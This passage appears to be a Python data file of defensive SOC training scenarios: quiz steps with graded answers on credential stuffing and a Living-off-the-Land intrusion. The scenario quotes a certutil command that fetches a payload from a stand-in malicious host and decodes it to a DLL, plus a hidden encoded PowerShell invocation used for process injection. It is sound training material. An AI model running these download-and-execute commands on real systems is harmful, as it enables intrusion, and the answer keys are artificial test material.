                'text': 'Immediately terminate all active VPN and cloud sessions for the 14 compromised accounts, force password resets, and enforce mandatory Multi-Factor Authentication (MFA) registration before re-login.',
                'is_correct': True,
                'xp': 20,
                'feedback': (
                    'Correct. Terminating active sessions and enforcing password resets + MFA neutralizes the attacker’s successful logins '
                    'and prevents unauthorized access to internal pharmaceutical networks.'
                ),
                'consequence': 'positive',
                'display_order': 1,
            },
            {
                'text': 'Send a postal letter to the employees\' home addresses asking them to change passwords next month.',
                'is_correct': False,
                'xp': 0,
                'feedback': (
                    'Incorrect. Postal letters are far too slow when adversary access has already succeeded.'
                ),
                'consequence': 'negative',
                'display_order': 2,
            },
            {
                'text': 'Do nothing because 14 accounts out of 50,000 is a very small number.',
                'is_correct': False,
                'xp': 0,
                'feedback': (
                    'Incorrect. A single compromised corporate VPN account is all an attacker needs to execute ransomware or exfiltrate clinical trial data.'
                ),
                'consequence': 'negative',
                'display_order': 3,
            },
        ],
    },
    {
        'step_number': 5,
        'title': 'Post-Incident Review & Identity Governance',
        'situation_text': (
            'The credential stuffing attack was neutralized, all 14 compromised accounts were secured with zero lateral movement, '
            'and mandatory MFA was rolled out across the entire VPN estate.\n\n'
            'LESSONS LEARNED:\n\n'
            'ATTACK PROFILE: Distributed Credential Stuffing utilizing residential proxy botnets and leaked credential databases.\n\n'
            'NIST PHASES COMPLETED:\n'
            '- Preparation: Centralized RADIUS/VPN authentication logging\n'
            '- Detection & Analysis: High-failure rate anomaly detection, residential proxy IP correlation\n'
            '- Containment: CAPTCHA challenge activation, threat intelligence IP reputation filtering\n'
            '- Eradication: Compromised session termination, mandatory password resets\n'
            '- Post-Incident Activity: Identity security policy hardening\n\n'
            'IDENTITY ARCHITECTURE ENHANCEMENTS:\n'
            '1. Enforced mandatory Multi-Factor Authentication (MFA) across 100% of external access portals with zero exemptions.\n'
            '2. Integrated Microsoft Entra Password Protection / HaveIBeenPwned API to automatically block known breached passwords during user password creation.\n'
            '3. Deployed Risk-Based Conditional Access: logins from unfamiliar IP/device locations automatically require step-up MFA verification.'
        ),
        'nist_phase': 'post_incident',
        'step_type': 'info',
        'is_final_step': True,
        'options': [],
    },
]


# ═══════════════════════════════════════════════════════════════════════════════
# S-APT-05: Living-off-the-Land Attack Using WMI and PowerShell (Advanced, 7 steps, 5 decisions)
# ═══════════════════════════════════════════════════════════════════════════════

S_APT_05_OBJECTIVES = [
    (1, 'Detect Living-off-the-Land Binaries and Scripts (LOLBAS) bypassing signature-based endpoint defenses.'),
    (2, 'Reconstruct encoded PowerShell commands and in-memory process injection chains.'),
    (3, 'Enforce PowerShell Constrained Language Mode and Application Control policies (AppLocker/WDAC).'),
    (4, 'Conduct comprehensive eradication and SOC behavioral playbook hardening across domain controllers.'),
]

S_APT_05_STEPS = [
    {
        'step_number': 1,
        'title': 'The Anomalous Certutil Execution',
        'situation_text': (
            'At 15:45 on a Thursday, EDR behavioral monitoring at FortiShield Managed Security detects an alert on server `SRV-APP-03`:\n\n'
            '- Process `certutil.exe` executed with command line arguments:\n'
            '  `certutil.exe -urlcache -split -f https://cdn.azure-blob-updates.com/stage.txt C:\\Windows\\Temp\\payload.b64`\n'
            '- Immediately followed by: `certutil.exe -decode C:\\Windows\\Temp\\payload.b64 C:\\Windows\\Temp\\stage.dll`\n'
            '- No malware alerts were raised by the antivirus engine because `certutil.exe` is a legitimate, digitally signed Microsoft Windows binary.\n\n'
            'You are the EDR Specialist leading the investigation.'
        ),
        'nist_phase': 'preparation',
        'step_type': 'info',
        'is_final_step': False,
        'options': [],
    },
    {
        'step_number': 2,
        'title': 'Decoding the Living-off-the-Land (LOLBAS) Vector',
        'situation_text': (
            'You inspect the process tree and parent-child execution telemetry on `SRV-APP-03`. You observe:\n\n'
            '- Parent Process: `wmic.exe` spawned `cmd.exe` which executed `certutil.exe`.\n'
            '- Execution of PowerShell: `powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -EncodedCommand JABjAGwAaQ...`\n'
            '- Decoded base64 script: Injects `stage.dll` into the memory space of `spoolsv.exe` (Print Spooler Service) using `VirtualAllocEx` and `CreateRemoteThread`.\n\n'
            'What adversary strategy does this sequence represent?'
        ),
        'nist_phase': 'detection',
        'step_type': 'decision',
        'is_final_step': False,
        'options': [
            {
                'text': 'A Living-off-the-Land (LOLBAS) attack utilizing native trusted Windows administrative tools (`wmic`, `certutil`, `powershell`) to download, decode, and inject fileless malware while evading signature defenses.',
                'is_correct': True,
                'xp': 30,
                'feedback': (
                    'Correct. Living-off-the-Land Binaries and Scripts (LOLBAS) abuse trusted legitimate operating system utilities '
                    '(e.g., `certutil` for file downloads, `wmic` for lateral execution, PowerShell for in-memory injection) to bypass traditional signature antivirus.'
                ),
                'consequence': 'positive',
                'display_order': 1,
            },
            {
                'text': 'A standard Windows Certificate Authority renewal script.',
                'is_correct': False,
                'xp': 0,
                'feedback': (
                    'Incorrect. Genuine certificate management does not decode base64 payloads from external Azure blobs and inject them into `spoolsv.exe`.'
                ),
                'consequence': 'negative',
                'display_order': 2,
            },
            {
                'text': 'A printer hardware paper jam diagnostic routine.',
                'is_correct': False,
                'xp': 0,
                'feedback': (
                    'Incorrect. Process injection into `spoolsv.exe` is a stealth technique to hide malicious C2 code inside a trusted system daemon.'
                ),
                'consequence': 'negative',
                'display_order': 3,
            },
        ],
    },
    {
        'step_number': 3,
        'title': 'Immediate Host & C2 Network Containment',
        'situation_text': (
            'The injected Print Spooler process on `SRV-APP-03` is actively establishing encrypted outbound TLS connections '
            'on port 443 to the malicious external Azure storage domain.\n\n'
            'What is your immediate containment action?'
        ),
        'nist_phase': 'containment',
        'step_type': 'decision',
        'is_final_step': False,
        'options': [
            {
                'text': 'Isolate `SRV-APP-03` via EDR network containment, terminate the compromised `spoolsv.exe` process, capture volatile memory, and block the malicious Azure storage URL at boundary proxies.',
                'is_correct': True,
                'xp': 30,
                'feedback': (
                    'Correct. EDR host isolation instantly severs external C2 channels and stops lateral spread, '
                    'while terminating the injected spooler and capturing RAM preserves essential volatile artifacts.'
                ),
                'consequence': 'positive',
                'display_order': 1,
            },
            {
                'text': 'Uninstall printer drivers from all office computers.',
                'is_correct': False,
                'xp': 0,
                'feedback': (
                    'Incorrect. The attack is an in-memory injection on an application server, not a printer driver compatibility issue.'
                ),
                'consequence': 'negative',
                'display_order': 2,
            },
            {
                'text': 'Delete the `certutil.exe` binary from `C:\\Windows\\System32\\`.',
                'is_correct': False,
                'xp': 0,
                'feedback': (
                    'Incorrect. Deleting critical core operating system binaries breaks system stability and certificate validation across Windows.'
                ),
                'consequence': 'negative',
                'display_order': 3,
            },
        ],
    },
    {
        'step_number': 4,
        'title': 'Enforcing Application Control & LOLBAS Restrictions',
        'situation_text': (
            'You must now configure enterprise-wide defenses to permanently prevent adversaries from abusing LOLBAS binaries '
            'like `certutil.exe`, `mshta.exe`, and `wscript.exe` for unauthorized downloads and code execution.\n\n'
            'What Windows security control prevents unauthorized execution of LOLBAS tools and untrusted scripts?'
        ),
        'nist_phase': 'eradication',
        'step_type': 'decision',
        'is_final_step': False,
        'options': [
            {
                'text': 'Deploy Windows Defender Application Control (WDAC) / AppLocker policies with LOLBAS recommended block rules, and enforce PowerShell Constrained Language Mode (CLM) system-wide.',
                'is_correct': True,
                'xp': 30,
                'feedback': (
                    'Correct. WDAC / AppLocker policies enforce application whitelisting and block known LOLBAS abuse patterns, '
                    'while PowerShell Constrained Language Mode (CLM) prevents in-memory API calls (`VirtualAlloc`, `Add-Type`).'
                ),
                'consequence': 'positive',
                'display_order': 1,
            },
            {
                'text': 'Change all file extensions on the server from `.exe` to `.txt`.',
                'is_correct': False,
                'xp': 0,
                'feedback': (
                    'Incorrect. Renaming extensions breaks the entire operating system.'
                ),
                'consequence': 'negative',
                'display_order': 2,
            },
            {
                'text': 'Ask users to promise not to type `certutil` into PowerShell.',
                'is_correct': False,
                'xp': 0,
                'feedback': (
                    'Incorrect. Attackers execute automated scripts, not voluntary manual commands.'
                ),
                'consequence': 'negative',
                'display_order': 3,
            },
        ],
    },
    {
        'step_number': 5,
        'title': 'Enabling Deep PowerShell Auditing & Script Block Logging',
        'situation_text': (
            'Adversaries often use base64-encoded commands to conceal their script syntax from command-line monitoring.\n\n'
            'What Windows logging policy must you enable to capture full, un-obfuscated script contents at runtime, regardless of encoding or obfuscation?'
        ),
        'nist_phase': 'eradication',
        'step_type': 'decision',
        'is_final_step': False,
        'options': [
            {
                'text': 'Enable PowerShell Script Block Logging (Event ID 4104), Module Logging (Event ID 4103), and Transcription via Group Policy (GPO).',
                'is_correct': True,
                'xp': 30,
                'feedback': (
                    'Correct. Script Block Logging (Event ID 4104) logs the complete, de-obfuscated code block executed by the PowerShell engine '
                    'at the moment of execution, rendering all base64 encoding and obfuscation visible to the SOC.'
                ),
                'consequence': 'positive',
                'display_order': 1,
            },
            {
                'text': 'Disable all logging on the server to save disk space.',
                'is_correct': False,
                'xp': 0,
                'feedback': (
                    'Incorrect. Disabling logging blinds the SOC to ongoing and future intrusions.'
                ),
                'consequence': 'negative',
                'display_order': 2,
            },
            {
                'text': 'Enable screen recording video on all server desktops.',
                'is_correct': False,
                'xp': 0,
                'feedback': (
                    'Incorrect. In-memory background PowerShell commands run without GUI desktop windows, so screen video captures nothing.'
                ),
                'consequence': 'negative',
                'display_order': 3,
            },
        ],
    },
    {
        'step_number': 6,
        'title': 'Enterprise-Wide Threat Hunting & Golden Rebuild',
        'situation_text': (
            'WDAC rules and Script Block Logging are deployed. You must ensure no other servers in the cluster '
            'contain injected processes or staged payloads in `C:\\Windows\\Temp\\`.\n\n'
            'What verification steps ensure complete enterprise recovery?'
        ),
        'nist_phase': 'recovery',
        'step_type': 'decision',
        'is_final_step': False,
        'options': [
            {
                'text': 'Execute fleet-wide EDR threat hunting queries for certutil `-urlcache` parameters, audit Event ID 4104 for encoded commands, reimage `SRV-APP-03` from a trusted baseline, and rotate all service credentials.',
                'is_correct': True,
                'xp': 30,
                'feedback': (
                    'Correct. Threat hunting across all servers confirms the infection was isolated, and rebuilding the server from a golden baseline '
                    'guarantees no residual persistence survives.'
                ),
                'consequence': 'positive',
                'display_order': 1,
            },
            {
                'text': 'Restart the server once and assume everything is clean.',
                'is_correct': False,
                'xp': 0,
                'feedback': (
                    'Incorrect. Restarting does not remove staged payloads or verify other cluster nodes.'
                ),
                'consequence': 'negative',
                'display_order': 2,
            },
            {
                'text': 'Delete the `C:\\Windows\\Temp` folder completely and turn off antivirus.',
                'is_correct': False,
                'xp': 0,
                'feedback': (
                    'Incorrect. Deleting system temp breaks Windows functionality and turning off antivirus invites immediate reinfection.'
                ),
                'consequence': 'negative',
                'display_order': 3,
            },
        ],
    },
    {
        'step_number': 7,
        'title': 'Post-Incident Review & SOC Playbook Hardening',
        'situation_text': (
            'The Living-off-the-Land APT intrusion was successfully eradicated. The injected payload was captured, '
            'WDAC policies prevent further LOLBAS downloads, and full Script Block Logging is active enterprise-wide.\n\n'
            'LESSONS LEARNED:\n\n'
            'ATTACK PROFILE: Living-off-the-Land (LOLBAS) via `certutil`, `wmic`, and fileless PowerShell process injection into `spoolsv.exe`.\n\n'
            'NIST PHASES COMPLETED:\n'
            '- Preparation: EDR behavioral anomaly detection rules\n'
            '- Detection & Analysis: Parent-child process telemetry analysis, base64 script decoding\n'
            '- Containment: EDR network host isolation, in-memory process termination, boundary C2 URL blocking\n'
            '- Eradication: WDAC / AppLocker application whitelisting, PowerShell Constrained Language Mode enforcement\n'
            '- Recovery: PowerShell Script Block Logging (Event ID 4104) deployment, golden re-image\n'
            '- Post-Incident Activity: LOLBAS SOC playbook update\n\n'
            'SECURITY POSTURE UPGRADES:\n'
            '1. Standardized WDAC application whitelisting across all tier-1 production servers.\n'
            '2. Blocked outbound internet access for built-in LOLBAS utilities (`certutil.exe`, `bitsadmin.exe`, `mshta.exe`) via perimeter firewall.\n'
            '3. Configured SIEM automated correlation rules alerting on any process execution from `C:\\Windows\\Temp\\` or `AppData` directories.'
        ),
        'nist_phase': 'post_incident',
        'step_type': 'info',
        'is_final_step': True,
        'options': [],
    },
]

NETWORK_APT_SCENARIOS = {
    'S-APT-01': (S_APT_01_OBJECTIVES, S_APT_01_STEPS),
    'S-APT-02': (S_APT_02_OBJECTIVES, S_APT_02_STEPS),
    'S-APT-03': (S_APT_03_OBJECTIVES, S_APT_03_STEPS),
    'S-APT-04': (S_APT_04_OBJECTIVES, S_APT_04_STEPS),
    'S-APT-05': (S_APT_05_OBJECTIVES, S_APT_05_STEPS),
}
